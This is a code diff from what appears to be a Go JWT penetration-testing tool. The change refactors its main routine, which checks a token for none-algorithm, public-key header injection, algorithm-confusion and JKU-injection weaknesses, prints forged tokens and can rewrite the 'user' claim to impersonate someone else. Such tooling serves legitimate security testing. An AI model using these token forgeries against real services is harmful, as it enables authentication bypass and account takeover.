@@ -8,34 +8,29 @@ import (
 	"github.com/golang-jwt/jwt/v5"
 )
 
-func MainMagic(jwtStr string, userHeader string, userValue string, publicKey string, url string) {
+var (
+	UserHeader string = ""
+	UserValue  string = ""
+)
 
+func MainMagic(jwtStr string, publicKey string, url string) {
+
+	//Parse token into struct
 	token := ctrl.StringToToken(jwtStr)
-
 	if token == nil {
 		fmt.Print("Error : Unable to parse the JWT\n")
 		return
 	}
 
-	//TODO : check if the payload to modify is a boolean
-	if userHeader == "" {
-		if claims, ok := token.Claims.(jwt.MapClaims); ok {
-
-			if _, ok := claims["user"]; ok {
-				userHeader = "user"
-			} else if _, ok := claims["username"]; ok {
-				userHeader = "username"
-			} else {
-				fmt.Print("The name of the \"user\" header is unknown\nThe tool will only generate tokens without modifying the \"user\" header\n\n")
-				fmt.Print("------------------------------------------------------\n\n")
-			}
-		}
+	//If no header has been given, check for a potential header to be modified
+	if UserHeader == "" {
+		checkForUserHeader(token)
 	}
 
 	//The token should always contains the "alg" header, but we check nevertheless
 	if alg, ok := token.Header["alg"]; ok {
 		fmt.Print("Checking if the token is vulnerable to the \"none algorithm\" attack\n\n")
-		newJWTStr := ExploitNoneAlgo(token, userHeader, userValue)
+		newJWTStr := ExploitNoneAlgo(token)
 		if newJWTStr != "" {
 			fmt.Printf("None algorithm : %s\n\n", newJWTStr)
 		}
@@ -47,7 +42,7 @@ func MainMagic(jwtStr string, userHeader string, userValue string, publicKey str
 		algStr := strings.ToLower(alg.(string))
 		if algStr[0:2] != "hs" {
 			fmt.Print("Checking if the token is vulnerable to the \"Public Key Header Injection\" attack\n\n")
-			newJWTStr = ExploitPublicKeyInjection(token, userHeader, userValue, algStr)
+			newJWTStr = ExploitPublicKeyInjection(token, algStr)
 			if newJWTStr != "" {
 				fmt.Printf("Algorithm Confusion : %s\n\n", newJWTStr)
 			}
@@ -56,7 +51,7 @@ func MainMagic(jwtStr string, userHeader string, userValue string, publicKey str
 			//If a file with a public key is provided, generate a token that may exploit the "Algorithm confusion" vuln
 			if publicKey != "" {
 				fmt.Print("Checking if the token is vulnerable to the \"Algorithm Confusion\" attack\n\n")
-				newJWTStr := ExploitAlgoConfusion(token, userHeader, userValue, algStr, publicKey)
+				newJWTStr := ExploitAlgoConfusion(token, algStr, publicKey)
 				if newJWTStr != "" {
 					fmt.Printf("Algorithm Confusion : %s\n\n", newJWTStr)
 					fmt.Print("------------------------------------------------------\n\n")
@@ -77,7 +72,7 @@ func MainMagic(jwtStr string, userHeader string, userValue string, publicKey str
 	if _, ok := token.Header["jku"]; ok {
 		fmt.Print("Your token contains the \"JKU\" header, it may be exploitable through header injection\n")
 		if url != "" {
-			newJWTStr, err := ExploitJKU(token, userHeader, userValue, url, false)
+			newJWTStr, err := ExploitJKU(token, url, false)
 			if err == nil {
 				fmt.Printf("JKU header injection  : %s\n\n", newJWTStr)
 			} else {
@@ -88,6 +83,32 @@ func MainMagic(jwtStr string, userHeader string, userValue string, publicKey str
 		}
 
 		fmt.Print("------------------------------------------------------\n\n")
+	}
+
+}
+
+func ChangeUserValue(token *jwt.Token) (*jwt.Token, error) {
+	if UserHeader != "" {
+		token, err := ctrl.ChangeValue(token, UserHeader, UserValue, false)
+		if err != nil {
+			return token, fmt.Errorf("An error ocurred while modifying the value of the \"%s\" header : %v \n", UserHeader, err)
+		}
+	}
+	return token, nil
+}
+
+// TODO : check if the payload to modify is a boolean
+func checkForUserHeader(token *jwt.Token) {
+	if claims, ok := token.Claims.(jwt.MapClaims); ok {
+
+		if _, ok := claims["user"]; ok {
+			UserHeader = "user"
+		} else if _, ok := claims["username"]; ok {
+			UserHeader = "username"
+		} else {
+			fmt.Print("The name of the \"user\" header is unknown\nThe tool will only generate tokens without modifying the \"user\" header\n\n")
+			fmt.Print("------------------------------------------------------\n\n")
+		}
 	}
 
 }
